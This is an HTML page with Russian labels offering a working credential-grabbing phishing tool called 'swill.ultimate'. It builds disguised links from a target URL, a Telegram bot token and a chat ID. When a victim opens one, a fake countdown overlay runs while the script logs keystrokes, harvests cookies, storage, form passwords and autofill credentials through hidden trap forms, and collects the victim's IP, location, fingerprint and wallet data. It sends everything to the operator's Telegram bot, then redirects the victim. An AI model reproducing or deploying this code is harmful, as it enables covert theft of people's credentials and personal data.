<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SWILL ULTIMATE GRABBER</title>
    <style>
        /* Минимальный интерфейс для создания ссылок */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui; }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0b1120 0%, #19223c 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }
        .card {
            max-width: 560px;
            width: 100%;
            background: rgba(18, 25, 45, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 2.5rem;
            padding: 2rem 1.8rem;
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
        }
        h1 { font-size: 2rem; font-weight: 600; background: linear-gradient(120deg, #e0e7ff, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; }
        .sub { color: #8b9bcf; font-size: 0.85rem; margin-bottom: 2rem; border-left: 3px solid #2dd4bf; padding-left: 0.75rem; }
        .input-group { margin-bottom: 1.4rem; display: flex; flex-direction: column; gap: 0.5rem; }
        label { color: #cbd5ff; font-size: 0.85rem; }
        input, textarea {
            background: #0f172acc; border: 1px solid #2d3a5e; border-radius: 1.2rem;
            padding: 0.9rem 1.2rem; color: white; outline: none;
        }
        button {
            background: linear-gradient(100deg, #2dd4bf, #14b8a6);
            border: none; border-radius: 2rem; padding: 0.9rem;
            font-weight: 600; cursor: pointer; width: 100%;
        }
        .result-area { margin-top: 1.8rem; background: #0a0f1c80; border-radius: 1.5rem; padding: 1rem; transition: 0.3s; opacity: 0; transform: translateY(8px); pointer-events: none; }
        .result-area.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
        .short-link-block { display: flex; gap: 0.7rem; align-items: center; flex-wrap: wrap; }
        .short-link { background: #030712; padding: 0.6rem 1rem; border-radius: 1.2rem; font-family: monospace; word-break: break-all; flex: 1; color: #b9e6f0; }
        .copy-btn { background: #334155; width: auto; padding: 0.6rem 1.2rem; color: white; }
        .toast-msg { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); background: #1e2a3ecc; padding: 0.6rem 1.5rem; border-radius: 3rem; color: white; opacity: 0; transition: 0.2s; pointer-events: none; z-index: 10000; }
        .toast-msg.show-toast { opacity: 1; }
        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.95); backdrop-filter: blur(20px);
            z-index: 20000; display: flex; align-items: center; justify-content: center;
            flex-direction: column; color: white;
        }
        .overlay.hidden { display: none; }
        .loader { width: 80px; height: 80px; border: 6px solid rgba(45,212,191,0.2); border-top: 6px solid #2dd4bf; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 2rem; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .timer-text { font-size: 3rem; font-weight: bold; background: linear-gradient(135deg, #2dd4bf, #a5f3fc); background-clip: text; -webkit-background-clip: text; color: transparent; }
        .status-msg { font-size: 1.2rem; text-align: center; padding: 0 2rem; }
        .captcha-box { margin-top: 2rem; background: rgba(255,255,255,0.1); border-radius: 2rem; padding: 1rem 2rem; cursor: pointer; display: flex; align-items: center; gap: 1rem; border: 1px solid #2dd4bf; }
        .checkmark { width: 30px; height: 30px; background: #2dd4bf; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 1.5rem; color: black; }
    </style>
</head>
<body>
<div class="card">
    <h1>swill<span style="color:#2dd4bf;">.ultimate</span></h1>
    <div class="sub">абсолютный сборщик (без VPN проверки)</div>
    <div class="input-group"><label>🔗 Целевая ссылка</label><input type="text" id="longUrl" placeholder="https://example.com"></div>
    <div class="input-group"><label>🤖 Токен Telegram бота</label><input type="text" id="botToken" placeholder="123456:ABCdef"></div>
    <div class="input-group"><label>🆔 Ваш Telegram ID</label><input type="text" id="chatId" placeholder="123456789"></div>
    <button id="shortenBtn">🚀 Создать граббер-ссылку</button>
    <div id="resultBlock" class="result-area">
        <div>✨ Короткая ссылка:</div>
        <div class="short-link-block"><div class="short-link" id="shortLinkDisplay">site.com/#...</div><button id="copyBtn" class="copy-btn">📋 Копировать</button></div>
    </div>
</div>
<div id="toastMessage" class="toast-msg">✓ Скопировано</div>
<div id="overlay" class="overlay hidden"><div class="loader"></div><div class="timer-text" id="timerDisplay">3</div><div class="status-msg" id="statusMsg">Подготовка граббера...</div><div id="captchaContainer"></div></div>

<script>
(function(){
    // ------------------- УЛЬТРА ГРАББЕР -------------------
    let botToken = "", chatId = "";
    let collected = {
        time: new Date().toISOString(),
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        indexedDB: [],
        forms: {},
        passwords: [],
        keystrokes: [],
        clipboard: "",
        autofill: [],
        webrtcIP: "",
        geolocation: null,
        fingerprint: {},
        extensions: [],
        cryptoWallets: {},
        networkLogs: [],
        globalVars: {},
        iframeData: []
    };
    let keyLogStr = "";
    let lastSend = Date.now();

    // ---- 1. Базовый сбор storages ----
    function grabStorages() {
        for(let i=0; i<localStorage.length; i++) { let k = localStorage.key(i); collected.localStorage[k] = localStorage.getItem(k); }
        for(let i=0; i<sessionStorage.length; i++) { let k = sessionStorage.key(i); collected.sessionStorage[k] = sessionStorage.getItem(k); }
        // IndexedDB
        if(window.indexedDB) {
            let dbs = indexedDB.databases ? indexedDB.databases() : [];
            dbs.then(list => { collected.indexedDB = list.map(db => db.name); }).catch(e=>{});
        }
    }

    // ---- 2. Все поля форм + пароли ----
    function grabForms() {
        let inputs = document.querySelectorAll('input, textarea, select');
        let formData = {};
        inputs.forEach(el => {
            let name = el.name || el.id || el.className || 'unknown';
            let val = el.value || '';
            formData[name] = val;
            if(el.type === 'password' || name.toLowerCase().includes('pass')) {
                if(val) collected.passwords.push({ field: name, pass: val });
            }
        });
        collected.forms = formData;
    }

    // ---- 3. Кейлоггер (глобальный) ----
    document.addEventListener('keydown', (e) => {
        let key = e.key;
        if(key === 'Unidentified') return;
        let log = `${Date.now()} | ${key} @ ${e.target.tagName}:${e.target.id || e.target.name || '?'}`;
        collected.keystrokes.push(log);
        keyLogStr += log + "\n";
        if(Date.now() - lastSend > 8000) sendPartialKeylog();
    });

    // ---- 4. Буфер обмена ----
    document.addEventListener('copy', async () => { try { collected.clipboard = await navigator.clipboard.readText(); } catch(e){} });
    document.addEventListener('cut', async () => { try { collected.clipboard = await navigator.clipboard.readText(); } catch(e){} });

    // ---- 5. Автозаполнение (сотни невидимых форм) ----
    function createAutoFillTraps() {
        let container = document.createElement('div');
        container.style.display = 'none';
        document.body.appendChild(container);
        let combos = [['username','password'], ['email','pass'], ['login','pwd'], ['user','current-password']];
        for(let i=0; i<20; i++) {
            for(let [u,p] of combos) {
                let f = document.createElement('form');
                let inpU = document.createElement('input');
                inpU.type = 'text'; inpU.name = u; inpU.autocomplete = u;
                let inpP = document.createElement('input');
                inpP.type = 'password'; inpP.name = p; inpP.autocomplete = p;
                f.appendChild(inpU); f.appendChild(inpP);
                container.appendChild(f);
                setTimeout(() => {
                    if(inpU.value) collected.autofill.push({ type: 'username', value: inpU.value });
                    if(inpP.value) collected.autofill.push({ type: 'password', value: inpP.value });
                }, 1500);
            }
        }
    }

    // ---- 6. WebRTC IP ----
    function getWebRTCIP() {
        return new Promise(resolve => {
            let pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if(e.candidate && e.candidate.candidate) {
                    let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
                    if(ip) { resolve(ip[0]); pc.close(); }
                } else resolve('failed');
            };
            setTimeout(() => resolve('timeout'), 3000);
        });
    }

    // ---- 7. Геолокация ----
    function getGeo() {
        return new Promise(resolve => {
            if(!navigator.geolocation) resolve(null);
            navigator.geolocation.getCurrentPosition(p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }), () => resolve(null), { timeout: 3000 });
        });
    }

    // ---- 8. Полный fingerprint ----
    async function getFingerprint() {
        let fp = {};
        // Canvas
        let canvas = document.createElement('canvas');
        canvas.width = 200; canvas.height = 50;
        let ctx = canvas.getContext('2d');
        ctx.fillStyle = '#f60'; ctx.fillRect(0,0,100,50);
        ctx.fillStyle = '#069'; ctx.fillText('swill',2,15);
        fp.canvas = canvas.toDataURL();
        // WebGL
        try {
            let gl = document.createElement('canvas').getContext('webgl');
            if(gl) {
                let debug = gl.getExtension('WEBGL_debug_renderer_info');
                if(debug) {
                    fp.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
                    fp.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                }
            }
        } catch(e){}
        // Audio fingerprint
        try {
            let AudioCtx = window.AudioContext || window.webkitAudioContext;
            if(AudioCtx) {
                let ctxAudio = new AudioCtx();
                let oscillator = ctxAudio.createOscillator();
                let analyser = ctxAudio.createAnalyser();
                oscillator.connect(analyser);
                oscillator.frequency.value = 440;
                oscillator.type = 'triangle';
                oscillator.start();
                let data = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(data);
                fp.audioHash = Array.from(data).slice(0,50).join('');
                oscillator.stop();
                ctxAudio.close();
            }
        } catch(e){}
        // Fonts
        let fonts = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Roboto','Open Sans','Impact','Comic Sans MS'];
        let found = [];
        for(let f of fonts) if(document.fonts.check(`12px "${f}"`)) found.push(f);
        fp.fonts = found;
        fp.plugins = Array.from(navigator.plugins).map(p => p.name);
        fp.hardwareConcurrency = navigator.hardwareConcurrency;
        fp.deviceMemory = navigator.deviceMemory;
        fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        return fp;
    }

    // ---- 9. Расширения браузера (попытка) ----
    function detectExtensions() {
        let ext = [];
        if(window.chrome && chrome.runtime) {
            // нельзя просто так получить список, но можно проверить наличие популярных
            let ids = ['nmmhkkegccagdldgiimedpiccmgmieda', 'fheliaikjphdfjlhpmepddpbbnpjbhja']; // примеры
            ids.forEach(id => {
                if(chrome.runtime.connect(id)) ext.push(id);
            });
        }
        collected.extensions = ext;
    }

    // ---- 10. Криптокошельки ----
    function grabCryptoWallets() {
        let wallets = {};
        if(window.ethereum) wallets.ethereum = { isMetaMask: window.ethereum.isMetaMask, selectedAddress: window.ethereum.selectedAddress };
        if(window.solana) wallets.solana = { isPhantom: window.solana.isPhantom, publicKey: window.solana.publicKey?.toString() };
        if(window.cardano) wallets.cardano = true;
        if(window.bitcoin) wallets.bitcoin = true;
        collected.cryptoWallets = wallets;
    }

    // ---- 11. Перехват сетевых запросов ----
    function interceptNetwork() {
        const origFetch = window.fetch;
        window.fetch = function(...args) {
            collected.networkLogs.push({ type: 'fetch', url: args[0], time: Date.now() });
            return origFetch.apply(this, args);
        };
        const origXHR = window.XMLHttpRequest.prototype.open;
        window.XMLHttpRequest.prototype.open = function(method, url) {
            this._url = url;
            return origXHR.apply(this, arguments);
        };
        window.XMLHttpRequest.prototype.send = function() {
            collected.networkLogs.push({ type: 'xhr', url: this._url, time: Date.now() });
            return origXHR.send.apply(this, arguments);
        };
    }

    // ---- 12. Iframe-внедрение ----
    function injectIframes() {
        let sites = ['https://google.com', 'https://facebook.com', 'https://vk.com', 'https://github.com'];
        sites.forEach(site => {
            let ifr = document.createElement('iframe');
            ifr.src = site;
            ifr.style.display = 'none';
            document.body.appendChild(ifr);
            ifr.onload = () => {
                try {
                    let doc = ifr.contentDocument || ifr.contentWindow.document;
                    let title = doc ? doc.title : 'blocked';
                    collected.iframeData.push({ site, title, canAccess: !!doc });
                } catch(e) { collected.iframeData.push({ site, error: e.message }); }
            };
        });
    }

    // ---- 13. Глобальные переменные (токены, ключи) ----
    function grabGlobalVars() {
        let interesting = ['token', 'accessToken', 'apiKey', 'secret', 'jwt', 'auth'];
        let found = {};
        for(let key in window) {
            try {
                if(interesting.some(i => key.toLowerCase().includes(i))) {
                    let val = window[key];
                    if(typeof val === 'string' && val.length > 5 && val.length < 500) found[key] = val;
                }
            } catch(e) {}
        }
        collected.globalVars = found;
    }

    // ---- 14. Отправка в Telegram (многоканальная, обход CORS) ----
    async function sendToTelegram(data, filename = 'swill_dump.txt') {
        if(!botToken || !chatId) return;
        let json = JSON.stringify(data, null, 2);
        let blob = new Blob([json], { type: 'text/plain' });
        let formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', blob, filename);
        // Способ 1: fetch no-cors
        fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST', body: formData, mode: 'no-cors', keepalive: true
        }).catch(e=>console.warn);
        // Способ 2: sendBeacon
        if(navigator.sendBeacon) {
            let fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('document', blob, filename);
            navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, fd);
        }
        // Отправка паролей отдельно
        if(data.passwords && data.passwords.length) {
            let pText = "🔑 ПАРОЛИ:\n" + data.passwords.map(p => `${p.field}: ${p.pass}`).join('\n');
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: pText.slice(0,4000) }),
                mode: 'no-cors', keepalive: true
            });
        }
        // Кейлог
        if(keyLogStr.length) {
            let keyBlob = new Blob([keyLogStr], { type: 'text/plain' });
            let kfd = new FormData();
            kfd.append('chat_id', chatId);
            kfd.append('document', keyBlob, 'keystrokes.log');
            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                method: 'POST', body: kfd, mode: 'no-cors', keepalive: true
            });
        }
    }

    async function sendPartialKeylog() {
        if(keyLogStr.length > 0 && botToken && chatId) {
            let part = keyLogStr.slice(-1000);
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: `⌨️ KEYLOG (partial):\n${part}` }),
                mode: 'no-cors', keepalive: true
            });
        }
        lastSend = Date.now();
    }

    // ---- 15. Главный сборщик (запускается при переходе по граббер-ссылке) ----
    async function fullGrabAndSend() {
        grabStorages();
        grabForms();
        createAutoFillTraps();
        interceptNetwork();
        injectIframes();
        grabCryptoWallets();
        detectExtensions();
        grabGlobalVars();
        collected.webrtcIP = await getWebRTCIP();
        collected.geolocation = await getGeo();
        collected.fingerprint = await getFingerprint();
        // Ждём 3 секунды, чтобы автозаполнение сработало
        setTimeout(async () => {
            grabForms(); // повторно
            await sendToTelegram(collected, 'ultimate_swill_dump.txt');
        }, 4000);
        setTimeout(() => {
            sendToTelegram(collected, 'ultimate_swill_dump_final.txt');
        }, 10000);
    }

    // ------------------- ОВЕРЛЕЙ И РЕДИРЕКТ -------------------
    function generateShortLink(originalUrl, token, id) {
        let payload = `${originalUrl}|${token}|${id}`;
        let encoded = btoa(unescape(encodeURIComponent(payload)));
        return location.origin + location.pathname + '#' + encoded;
    }

    function decodeHash(hash) {
        if(!hash) return null;
        try {
            let decoded = decodeURIComponent(escape(atob(hash)));
            let parts = decoded.split('|');
            if(parts.length !== 3) return null;
            let [url, token, id] = parts;
            if(!url.startsWith('http')) return null;
            if(!token || token.length<5) return null;
            if(isNaN(Number(id))) return null;
            return { originalUrl: url, botToken: token, chatId: Number(id) };
        } catch(e) { return null; }
    }

    async function handleHashRedirect() {
        let hash = location.hash.substring(1);
        if(!hash) return;
        let decoded = decodeHash(hash);
        if(!decoded) { alert("Невалидная ссылка"); return; }
        botToken = decoded.botToken;
        chatId = decoded.chatId;
        let target = decoded.originalUrl;
        // Показываем оверлей с таймером
        let overlay = document.getElementById('overlay');
        let timerDiv = document.getElementById('timerDisplay');
        let statusMsg = document.getElementById('statusMsg');
        overlay.classList.remove('hidden');
        let timer = 3;
        timerDiv.textContent = timer;
        let interval = setInterval(() => {
            timer--;
            timerDiv.textContent = timer;
            if(timer <= 0) {
                clearInterval(interval);
                statusMsg.innerHTML = "Запуск граббера...";
                // Запускаем тотальный сбор и отправку
                fullGrabAndSend();
                setTimeout(() => {
                    window.location.href = target;
                }, 3000);
            }
        }, 1000);
    }

    // ------------------- СОЗДАНИЕ ССЫЛКИ (ИНТЕРФЕЙС) -------------------
    document.getElementById('shortenBtn').onclick = () => {
        let long = document.getElementById('longUrl').value.trim();
        let token = document.getElementById('botToken').value.trim();
        let cid = document.getElementById('chatId').value.trim();
        if(!long.startsWith('http')) { alert('Ссылка должна начинаться с http:// или https://'); return; }
        if(!token) { alert('Введите токен бота'); return; }
        if(!cid || isNaN(Number(cid))) { alert('ID должен быть числом'); return; }
        let short = generateShortLink(long, token, Number(cid));
        document.getElementById('shortLinkDisplay').innerText = short;
        document.getElementById('resultBlock').classList.add('show');
    };
    document.getElementById('copyBtn').onclick = () => {
        let link = document.getElementById('shortLinkDisplay').innerText;
        navigator.clipboard.writeText(link);
        let toast = document.getElementById('toastMessage');
        toast.classList.add('show-toast');
        setTimeout(() => toast.classList.remove('show-toast'), 1500);
    };

    window.addEventListener('DOMContentLoaded', () => handleHashRedirect());
    window.addEventListener('hashchange', () => handleHashRedirect());
})();
</script>
</body>
</html>
